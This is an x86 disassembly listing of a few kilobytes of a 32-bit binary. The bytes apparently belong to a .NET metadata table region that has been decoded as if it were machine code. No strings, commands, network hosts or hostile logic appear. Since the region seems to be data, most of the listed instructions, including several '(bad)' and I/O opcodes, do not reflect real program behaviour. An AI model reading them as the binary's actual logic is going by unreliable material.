  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	34 21                	xor    $0x21,%al
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	40                   	inc    %eax
  4069ad:	21 55 02             	and    %edx,0x2(%ebp)
  4069b0:	5b                   	pop    %ebx
  4069b1:	00 c0                	add    %al,%al
  4069b3:	54                   	push   %esp
  4069b4:	00 00                	add    %al,(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	86 08                	xchg   %cl,(%eax)
  4069ba:	2b 25 5a 02 5c 00    	sub    0x5c025a,%esp
  4069c0:	67 25 00 00 00 00    	addr16 and $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	45                   	inc    %ebp
  4069c9:	0f 5f 02             	maxps  (%edx),%xmm0
  4069cc:	5c                   	pop    %esp
  4069cd:	00 6f 25             	add    %ch,0x25(%edi)
  4069d0:	00 00                	add    %al,(%eax)
  4069d2:	00 00                	add    %al,(%eax)
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	cd 1d                	int    $0x1d
  4069d8:	64 02 5c 00 7c       	add    %fs:0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	04 1e                	add    $0x1e,%al
  4069e6:	0e                   	push   %cs
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 83 09 b1 02 5c    	add    %al,0x5c02b109(%ebx)
  4069f7:	00 8f 25 00 00 00    	add    %cl,0x25(%edi)
  4069fd:	00 96 00 55 04 b8    	add    %dl,-0x47fbab00(%esi)
  406a03:	02 5e 00             	add    0x0(%esi),%bl
  406a06:	44                   	inc    %esp
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 95 0f be 02 5f    	add    %dl,0x5f02be0f(%ebp)
  406a13:	00 78 20             	add    %bh,0x20(%eax)
  406a16:	00 00                	add    %al,(%eax)
  406a18:	00 00                	add    %al,(%eax)
  406a1a:	86 18                	xchg   %bl,(%eax)
  406a1c:	04 1e                	add    $0x1e,%al
  406a1e:	0e                   	push   %cs
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 49 04             	add    %cl,0x4(%ecx)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 b7 02 cb 02 62    	add    %dh,0x6202cb02(%edi)
  406a3d:	00 cc                	add    %cl,%ah
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 96 12 d2 02 64    	add    %dl,0x6402d212(%esi)
  406a4b:	00 ab 25 00 00 00    	add    %ch,0x25(%ebx)
  406a51:	00 96 00 cc 05 da    	add    %dl,-0x25fa3400(%esi)
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 8c 03 e1 02 68 00 	add    %cl,0x6802e1(%ebx,%eax,1)
  406a68:	e6 25                	out    %al,$0x25
  406a6a:	00 00                	add    %al,(%eax)
  406a6c:	00 00                	add    %al,(%eax)
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 e4                	add    %ah,%ah
  406a71:	06                   	push   %es
  406a72:	e8 02 6a 00 6c       	call   0x6c40d479
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 6f 0a             	add    %ch,0xa(%edi)
  406a80:	ef                   	out    %eax,(%dx)
  406a81:	02 6c 00 9c          	add    -0x64(%eax,%eax,1),%ch
  406a85:	57                   	push   %edi
  406a86:	00 00                	add    %al,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 8a 15 f6 02 6e    	add    %cl,0x6e02f615(%edx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	04 1e                	add    $0x1e,%al
  406a9c:	0e                   	push   %cs
  406a9d:	00 70 00             	add    %dh,0x0(%eax)
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 52 1e             	add    %dl,0x1e(%edx)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 2b                	add    %ch,(%ebx)
  406ab7:	1c 84                	sbb    $0x84,%al
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	7d 03                	jge    0x406ac5
  406ac2:	00 00                	add    %al,(%eax)
  406ac4:	01 00                	add    %eax,(%eax)
  406ac6:	7c 1a                	jl     0x406ae2
  406ac8:	00 00                	add    %al,(%eax)
  406aca:	01 00                	add    %eax,(%eax)
  406acc:	4b                   	dec    %ebx
  406acd:	02 00                	add    (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 18                	add    %bl,(%eax)
  406ad3:	03 00                	add    (%eax),%eax
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 85 1b 00 00 01    	add    %al,0x100001b(%ebp)
  406add:	00 39                	add    %bh,(%ecx)
  406adf:	1e                   	push   %ds
  406ae0:	00 00                	add    %al,(%eax)
  406ae2:	01 00                	add    %eax,(%eax)
  406ae4:	c5 0a                	lds    (%edx),%ecx
  406ae6:	00 00                	add    %al,(%eax)
  406ae8:	01 00                	add    %eax,(%eax)
  406aea:	b7 14                	mov    $0x14,%bh
  406aec:	00 00                	add    %al,(%eax)
  406aee:	01 00                	add    %eax,(%eax)
  406af0:	49                   	dec    %ecx
  406af1:	07                   	pop    %es
  406af2:	00 00                	add    %al,(%eax)
  406af4:	01 00                	add    %eax,(%eax)
  406af6:	66 1e                	pushw  %ds
  406af8:	00 00                	add    %al,(%eax)
  406afa:	01 00                	add    %eax,(%eax)
  406afc:	56                   	push   %esi
  406afd:	02 00                	add    (%eax),%al
  406aff:	00 01                	add    %al,(%ecx)
  406b01:	00 19                	add    %bl,(%ecx)
  406b03:	02 00                	add    (%eax),%al
  406b05:	00 02                	add    %al,(%edx)
  406b07:	00 38                	add    %bh,(%eax)
  406b09:	19 00                	sbb    %eax,(%eax)
  406b0b:	00 03                	add    %al,(%ebx)
  406b0d:	00 09                	add    %cl,(%ecx)
  406b0f:	03 00                	add    (%eax),%eax
  406b11:	00 04 00             	add    %al,(%eax,%eax,1)
  406b14:	28 24 00             	sub    %ah,(%eax,%eax,1)
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 ae 1b 00 00 01    	add    %ch,0x100001b(%esi)
  406b1f:	00 53 01             	add    %dl,0x1(%ebx)
  406b22:	00 00                	add    %al,(%eax)
  406b24:	01 00                	add    %eax,(%eax)
  406b26:	ae                   	scas   %es:(%edi),%al
  406b27:	18 00                	sbb    %al,(%eax)
  406b29:	00 01                	add    %al,(%ecx)
  406b2b:	00 1f                	add    %bl,(%edi)
  406b2d:	1c 00                	sbb    $0x0,%al
  406b2f:	00 01                	add    %al,(%ecx)
  406b31:	00 80 08 00 00 01    	add    %al,0x1000008(%eax)
  406b37:	00 75 09             	add    %dh,0x9(%ebp)
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	a8 08                	test   $0x8,%al
  406b40:	00 00                	add    %al,(%eax)
  406b42:	02 00                	add    (%eax),%al
  406b44:	9c                   	pushf
  406b45:	0c 00                	or     $0x0,%al
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 a9 02 00 00 01    	add    %ch,0x1000002(%ecx)
  406b4f:	00 6b 06             	add    %ch,0x6(%ebx)
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	1d 16 00 00 02       	sbb    $0x2000016,%eax
  406b5b:	00 15 04 00 00 01    	add    %dl,0x1000004
  406b61:	00 c4                	add    %al,%ah
  406b63:	14 00                	adc    $0x0,%al
  406b65:	00 01                	add    %al,(%ecx)
  406b67:	00 c6                	add    %al,%dh
  406b69:	23 00                	and    (%eax),%eax
  406b6b:	00 02                	add    %al,(%edx)
  406b6d:	00 42 0d             	add    %al,0xd(%edx)
  406b70:	00 00                	add    %al,(%eax)
  406b72:	03 00                	add    (%eax),%eax
  406b74:	14 05                	adc    $0x5,%al
  406b76:	00 00                	add    %al,(%eax)
  406b78:	01 00                	add    %eax,(%eax)
  406b7a:	41                   	inc    %ecx
  406b7b:	24 00                	and    $0x0,%al
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 c0                	add    %al,%al
  406b81:	12 00                	adc    (%eax),%al
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 92 24 00 00 02    	add    %dl,0x2000024(%edx)
  406b8b:	00 f6                	add    %dh,%dh
  406b8d:	07                   	pop    %es
  406b8e:	00 00                	add    %al,(%eax)
  406b90:	01 00                	add    %eax,(%eax)
  406b92:	fb                   	sti
  406b93:	14 00                	adc    $0x0,%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 b1 03 00 00 01    	add    %dh,0x1000003(%ecx)
  406b9d:	00 6f 03             	add    %ch,0x3(%edi)
  406ba0:	00 00                	add    %al,(%eax)
  406ba2:	01 00                	add    %eax,(%eax)
  406ba4:	22 04 00             	and    (%eax,%eax,1),%al
  406ba7:	00 01                	add    %al,(%ecx)
  406ba9:	00 9a 1d 00 00 01    	add    %bl,0x100001d(%edx)
  406baf:	00 d8                	add    %bl,%al
  406bb1:	00 00                	add    %al,(%eax)
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 90 14 00 00 01    	add    %dl,0x1000014(%eax)
  406bbb:	00 38                	add    %bh,(%eax)
  406bbd:	08 00                	or     %al,(%eax)
  406bbf:	00 01                	add    %al,(%ecx)
  406bc1:	00 d9                	add    %bl,%cl
  406bc3:	09 00                	or     %eax,(%eax)
  406bc5:	00 01                	add    %al,(%ecx)
  406bc7:	00 5c 24 00          	add    %bl,0x0(%esp)
  406bcb:	00 01                	add    %al,(%ecx)
  406bcd:	00 97 26 00 00 02    	add    %dl,0x2000026(%edi)
  406bd3:	00 4f 24             	add    %cl,0x24(%edi)
  406bd6:	00 00                	add    %al,(%eax)
  406bd8:	01 00                	add    %eax,(%eax)
  406bda:	a3 07 00 00 01       	mov    %eax,0x1000007
  406bdf:	00 03                	add    %al,(%ebx)
  406be1:	16                   	push   %ss
  406be2:	00 00                	add    %al,(%eax)
  406be4:	01 00                	add    %eax,(%eax)
  406be6:	07                   	pop    %es
  406be7:	15 00 00 01 00       	adc    $0x10000,%eax
  406bec:	a1 06 00 00 01       	mov    0x1000006,%eax
  406bf1:	00 08                	add    %cl,(%eax)
  406bf3:	17                   	pop    %ss
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	9c                   	pushf
  406bf9:	23 00                	and    (%eax),%eax
  406bfb:	00 01                	add    %al,(%ecx)
  406bfd:	00 fb                	add    %bh,%bl
  406bff:	02 00                	add    (%eax),%al
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 69 12             	add    %ch,0x12(%ecx)
  406c06:	00 00                	add    %al,(%eax)
  406c08:	01 00                	add    %eax,(%eax)
  406c0a:	5a                   	pop    %edx
  406c0b:	06                   	push   %es
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	74 08                	je     0x406c1a
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	67 23 00             	and    (%bx,%si),%eax
  406c19:	00 01                	add    %al,(%ecx)
  406c1b:	00 dd                	add    %bl,%ch
  406c1d:	03 00                	add    (%eax),%eax
  406c1f:	00 01                	add    %al,(%ecx)
  406c21:	00 d5                	add    %dl,%ch
  406c23:	25 00 00 02 00       	and    $0x20000,%eax
  406c28:	cb                   	lret
  406c29:	06                   	push   %es
  406c2a:	00 00                	add    %al,(%eax)
  406c2c:	01 00                	add    %eax,(%eax)
  406c2e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406c2f:	09 00                	or     %eax,(%eax)
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 ba 25 00 00 01    	add    %bh,0x1000025(%edx)
  406c39:	00 99 03 00 00 01    	add    %bl,0x1000003(%ecx)
  406c3f:	00 d6                	add    %dl,%dh
  406c41:	06                   	push   %es
  406c42:	00 00                	add    %al,(%eax)
  406c44:	01 00                	add    %eax,(%eax)
  406c46:	eb 02                	jmp    0x406c4a
  406c48:	00 00                	add    %al,(%eax)
  406c4a:	01 00                	add    %eax,(%eax)
  406c4c:	de 01                	fiadds (%ecx)
  406c4e:	00 00                	add    %al,(%eax)
  406c50:	01 00                	add    %eax,(%eax)
  406c52:	10 16                	adc    %dl,(%esi)
  406c54:	00 00                	add    %al,(%eax)
  406c56:	01 00                	add    %eax,(%eax)
  406c58:	e2 18                	loop   0x406c72
  406c5a:	00 00                	add    %al,(%eax)
  406c5c:	01 00                	add    %eax,(%eax)
  406c5e:	9b                   	fwait
  406c5f:	02 00                	add    (%eax),%al
  406c61:	00 01                	add    %al,(%ecx)
  406c63:	00 40 13             	add    %al,0x13(%eax)
  406c66:	00 00                	add    %al,(%eax)
  406c68:	01 00                	add    %eax,(%eax)
  406c6a:	21 0a                	and    %ecx,(%edx)
  406c6c:	00 00                	add    %al,(%eax)
  406c6e:	01 00                	add    %eax,(%eax)
  406c70:	7f 14                	jg     0x406c86
  406c72:	00 00                	add    %al,(%eax)
  406c74:	01 00                	add    %eax,(%eax)
  406c76:	4b                   	dec    %ebx
  406c77:	1b 00                	sbb    (%eax),%eax
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 d9                	add    %bl,%cl
  406c7d:	24 00                	and    $0x0,%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 6d 26             	add    %ch,0x26(%ebp)
  406c84:	00 00                	add    %al,(%eax)
  406c86:	02 00                	add    (%eax),%al
  406c88:	03 25 00 00 01 00    	add    0x10000,%esp
  406c8e:	49                   	dec    %ecx
  406c8f:	0a 00                	or     (%eax),%al
  406c91:	00 01                	add    %al,(%ecx)
  406c93:	00 55 03             	add    %dl,0x3(%ebp)
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	f3 05 00 00 01 00    	repz add $0x10000,%eax
  406ca0:	6e                   	outsb  %ds:(%esi),(%dx)
  406ca1:	07                   	pop    %es
  406ca2:	00 00                	add    %al,(%eax)
  406ca4:	01 00                	add    %eax,(%eax)
  406ca6:	91                   	xchg   %eax,%ecx
  406ca7:	0c 00                	or     $0x0,%al
  406ca9:	00 01                	add    %al,(%ecx)
  406cab:	00 ff                	add    %bh,%bh
  406cad:	05 00 00 01 00       	add    $0x10000,%eax
  406cb2:	3d 03 00 00 01       	cmp    $0x1000003,%eax
  406cb7:	00 a2 24 00 00 01    	add    %ah,0x1000024(%edx)
  406cbd:	00 a9 14 00 00 01    	add    %ch,0x1000014(%ecx)
  406cc3:	00 11                	add    %dl,(%ecx)
  406cc5:	1c 00                	sbb    $0x0,%al
  406cc7:	00 01                	add    %al,(%ecx)
  406cc9:	00 0a                	add    %cl,(%edx)
  406ccb:	02 00                	add    (%eax),%al
  406ccd:	00 01                	add    %al,(%ecx)
  406ccf:	00 e9                	add    %ch,%cl
  406cd1:	03 00                	add    (%eax),%eax
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 15 26 00 00 01    	add    %dl,0x1000026
  406cdb:	00 fb                	add    %bh,%bl
  406cdd:	26 00 00             	add    %al,%es:(%eax)
  406ce0:	01 00                	add    %eax,(%eax)
  406ce2:	0c 24                	or     $0x24,%al
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	ef                   	out    %eax,(%dx)
  406ce9:	1a 00                	sbb    (%eax),%al
  406ceb:	00 01                	add    %al,(%ecx)
  406ced:	00 c2                	add    %al,%dl
  406cef:	03 00                	add    (%eax),%eax
  406cf1:	00 01                	add    %al,(%ecx)
  406cf3:	00 23                	add    %ah,(%ebx)
  406cf5:	03 00                	add    (%eax),%eax
  406cf7:	00 02                	add    %al,(%edx)
  406cf9:	00 4f 09             	add    %cl,0x9(%edi)
  406cfc:	00 00                	add    %al,(%eax)
  406cfe:	01 00                	add    %eax,(%eax)
  406d00:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406d01:	12 00                	adc    (%eax),%al
  406d03:	00 01                	add    %al,(%ecx)
  406d05:	00 20                	add    %ah,(%eax)
  406d07:	08 00                	or     %al,(%eax)
  406d09:	00 02                	add    %al,(%edx)
  406d0b:	00 d1                	add    %dl,%cl
  406d0d:	26 00 00             	add    %al,%es:(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	11 07                	adc    %eax,(%edi)
  406d14:	00 00                	add    %al,(%eax)
  406d16:	02 00                	add    (%eax),%al
  406d18:	12 15 00 00 01 00    	adc    0x10000,%dl
  406d1e:	cb                   	lret
  406d1f:	1b 00                	sbb    (%eax),%eax
  406d21:	00 02                	add    %al,(%edx)
  406d23:	00 88 07 00 00 01    	add    %cl,0x1000007(%eax)
  406d29:	00 a4 26 00 00 02 00 	add    %ah,0x20000(%esi,%eiz,1)
  406d30:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406d31:	03 00                	add    (%eax),%eax
  406d33:	00 01                	add    %al,(%ecx)
  406d35:	00 53 1a             	add    %dl,0x1a(%ebx)
  406d38:	00 00                	add    %al,(%eax)
  406d3a:	02 00                	add    (%eax),%al
  406d3c:	5c                   	pop    %esp
  406d3d:	09 00                	or     %eax,(%eax)
  406d3f:	00 01                	add    %al,(%ecx)
  406d41:	00 8d 05 00 00 02    	add    %cl,0x2000005(%ebp)
  406d47:	00 82 23 00 00 01    	add    %al,0x1000023(%edx)
  406d4d:	00 8d 23 00 00 02    	add    %cl,0x2000023(%ebp)
  406d53:	00 73 0f             	add    %dh,0xf(%ebx)
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	0b 0a                	or     (%edx),%ecx
  406d5c:	00 00                	add    %al,(%eax)
  406d5e:	01 00                	add    %eax,(%eax)
  406d60:	51                   	push   %ecx
  406d61:	16                   	push   %ss
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 86 22 bb    	add    %dh,-0x44dd7a00(%ecx)
  406d6f:	01 b1 00 44 23 bf    	add    %esi,-0x40dcbc00(%ecx)
  406d75:	01 b1 00 ad 21 0e    	add    %esi,0xe21ad00(%ecx)
  406d7b:	00 b9 00 ec 1d 64    	add    %bh,0x641dec00(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 04 1e             	add    %al,(%esi,%ebx,1)
  406d86:	01 03                	add    %eax,(%ebx)
  406d88:	d1 00                	roll   $1,(%eax)
  406d8a:	04 1e                	add    $0x1e,%al
  406d8c:	0e                   	push   %cs
  406d8d:	00 d9                	add    %bl,%cl
  406d8f:	00 04 1e             	add    %al,(%esi,%ebx,1)
  406d92:	2e 03 e9             	cs add %ecx,%ebp
  406d95:	00 04 1e             	add    %al,(%esi,%ebx,1)
  406d98:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  406d9b:	00 04 1e             	add    %al,(%esi,%ebx,1)
  406d9e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  406da1:	00 04 1e             	add    %al,(%esi,%ebx,1)
  406da4:	6b 01 01             	imul   $0x1,(%ecx),%eax
  406da7:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406daa:	6b 01 09             	imul   $0x9,(%ecx),%eax
  406dad:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406db0:	6b 01 11             	imul   $0x11,(%ecx),%eax
  406db3:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406db6:	6b 01 19             	imul   $0x19,(%ecx),%eax
  406db9:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406dbc:	6b 01 21             	imul   $0x21,(%ecx),%eax
  406dbf:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406dc2:	6b 01 29             	imul   $0x29,(%ecx),%eax
  406dc5:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406dc8:	6b 01 31             	imul   $0x31,(%ecx),%eax
  406dcb:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406dce:	4b                   	dec    %ebx
  406dcf:	02 39                	add    (%ecx),%bh
  406dd1:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406dd4:	0e                   	push   %cs
  406dd5:	00 41 01             	add    %al,0x1(%ecx)
  406dd8:	04 1e                	add    $0x1e,%al
  406dda:	6b 01 49             	imul   $0x49,(%ecx),%eax
  406ddd:	01 38                	add    %edi,(%eax)
  406ddf:	1b 7f 00             	sbb    0x0(%edi),%edi
  406de2:	51                   	push   %ecx
  406de3:	01 44 00 c4          	add    %eax,-0x3c(%eax,%eax,1)
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	cf                   	iret
  406deb:	21 7f 00             	and    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 ee                	add    %ebp,%esi
  406df1:	18 84 00 09 00 04 1e 	sbb    %al,0x1e040009(%eax,%eax,1)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	8a 00                	mov    (%eax),%al
  406dfe:	cd 03                	int    $0x3
  406e00:	51                   	push   %ecx
  406e01:	01 d8                	add    %ebx,%eax
  406e03:	13 2a                	adc    (%edx),%ebp
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	2a 14 d3             	sub    (%ebx,%edx,8),%dl
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 04 1e             	add    %al,(%esi,%ebx,1)
  406e10:	2b 02                	sub    (%edx),%eax
  406e12:	11 00                	adc    %eax,(%eax)
  406e14:	6c                   	insb   (%dx),%es:(%edi)
  406e15:	25 d9 03 69 01       	and    $0x16903d9,%eax
  406e1a:	44                   	inc    %esp
  406e1b:	25 df 03 61 01       	and    $0x16103df,%eax
  406e20:	9f                   	lahf
  406e21:	1f                   	pop    %ds
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 2a 01 c7 00    	addl   $0xc7012a,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	37                   	aaa
  406e2d:	15 eb 03 19 00       	adc    $0x1903eb,%eax
  406e32:	04 1e                	add    $0x1e,%al
  406e34:	09 04 19             	or     %eax,(%ecx,%ebx,1)
  406e37:	00 47 12             	add    %al,0x12(%edi)
  406e3a:	01 03                	add    %eax,(%ebx)
  406e3c:	19 00                	sbb    %eax,(%eax)
  406e3e:	34 12                	xor    $0x12,%al
  406e40:	01 03                	add    %eax,(%ebx)
  406e42:	c1 01 21             	roll   $0x21,(%ecx)
  406e45:	26 16                	es push %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 c9                	add    %ecx,%ecx
  406e4b:	21 1c 04             	and    %ebx,(%esp,%eax,1)
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	04 1e                	add    $0x1e,%al
  406e52:	0e                   	push   %cs
  406e53:	00 d1                	add    %dl,%cl
  406e55:	01 48 23             	add    %ecx,0x23(%eax)
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 40 1f             	add    %eax,0x1f(%eax)
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 69 21             	add    %ch,0x21(%ecx)
  406e64:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e67:	00 0f                	add    %cl,(%edi)
  406e69:	0b bf 01 19 00 69    	or     0x69001901(%edi),%edi
  406e6f:	21 3c 02             	and    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406e76:	0e                   	push   %cs
  406e77:	00 a1 01 04 1e 36    	add    %ah,0x361e0401(%ecx)
  406e7d:	02 99 01 fe 1f 38    	add    0x381ffe01(%ecx),%bl
  406e83:	04 99                	add    $0x99,%al
  406e85:	01 f8                	add    %edi,%eax
  406e87:	13 70 01             	adc    0x1(%eax),%esi
  406e8a:	c1 01 c9             	roll   $0xc9,(%ecx)
  406e8d:	21 3f                	and    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 48 23             	add    %ecx,0x23(%eax)
  406e94:	49                   	dec    %ecx
  406e95:	04 f1                	add    $0xf1,%al
  406e97:	01 ab 0f 0e 00 f9    	add    %ebp,-0x6fff1f1(%ebx)
  406e9d:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406ea0:	4f                   	dec    %edi
  406ea1:	04 01                	add    $0x1,%al
  406ea3:	02 04 1e             	add    (%esi,%ebx,1),%al
  406ea6:	56                   	push   %esi
  406ea7:	04 21                	add    $0x21,%al
  406ea9:	00 04 1e             	add    %al,(%esi,%ebx,1)
  406eac:	5c                   	pop    %esp
  406ead:	04 19                	add    $0x19,%al
  406eaf:	00 b8 22 66 04 09    	add    %bh,0x9046622(%eax)
  406eb5:	00 07                	add    %al,(%edi)
  406eb7:	14 47                	adc    $0x47,%al
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 34 22             	add    %dh,(%edx,%eiz,1)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 04 1e             	add    (%esi,%ebx,1),%al
  406ec4:	56                   	push   %esi
  406ec5:	04 29                	add    $0x29,%al
  406ec7:	00 04 1e             	add    %al,(%esi,%ebx,1)
  406eca:	78 04                	js     0x406ed0
  406ecc:	31 02                	xor    %eax,(%edx)
  406ece:	04 1e                	add    $0x1e,%al
  406ed0:	56                   	push   %esi
  406ed1:	04 c1                	add    $0xc1,%al
  406ed3:	00 e7                	add    %ah,%bh
  406ed5:	0a 82 04 39 02 de    	or     -0x21fdc6fc(%edx),%al
  406edb:	0e                   	push   %cs
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 0e                	add    %cl,(%esi)
  406ee1:	20 96 04 c1 00 ab    	and    %dl,-0x54ff3efc(%esi)
  406ee7:	0f 0e                	femms
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 ab 0f 0e 00 29    	add    %ch,0x29000e0f(%ebx)
  406ef1:	00 ab 0f 0e 00 c1    	add    %ch,-0x3efff1f1(%ebx)
  406ef7:	00 df                	add    %bl,%bh
  406ef9:	0a a1 04 49 02 44    	or     0x44024904(%ecx),%ah
  406eff:	00 a7 04 c1 00 ec    	add    %ah,-0x13ff3efc(%edi)
  406f05:	0a ae 04 51 02 04    	or     0x4025104(%esi),%ch
  406f0b:	1e                   	push   %ds
  406f0c:	56                   	push   %esi
  406f0d:	04 49                	add    $0x49,%al
  406f0f:	01 04 1e             	add    %eax,(%esi,%ebx,1)
  406f12:	b6 04                	mov    $0x4,%dh
  406f14:	49                   	dec    %ecx
  406f15:	01 07                	add    %eax,(%edi)
  406f17:	23 bd 04 61 02 6f    	and    0x6f026104(%ebp),%edi
  406f1d:	1d cf 04 49 02       	sbb    $0x24904cf,%eax
  406f22:	9f                   	lahf
  406f23:	1f                   	pop    %ds
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 bf 17 d6 04 c1    	add    %bh,-0x3efb29e9(%edi)
  406f2d:	00 03                	add    %al,(%ebx)
  406f2f:	10 de                	adc    %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 04 1e             	add    (%esi,%ebx,1),%al
  406f36:	2b 02                	sub    (%edx),%eax
  406f38:	c1 00 07             	roll   $0x7,(%eax)
  406f3b:	1a 15 02 c1 00 42    	sbb    0x4200c102,%dl
  406f41:	15 0e 00 61 02       	adc    $0x261000e,%eax
  406f46:	cf                   	iret
  406f47:	21 9a 00 71 02 61    	and    %ebx,0x61027100(%edx)
  406f4d:	21 0a                	and    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
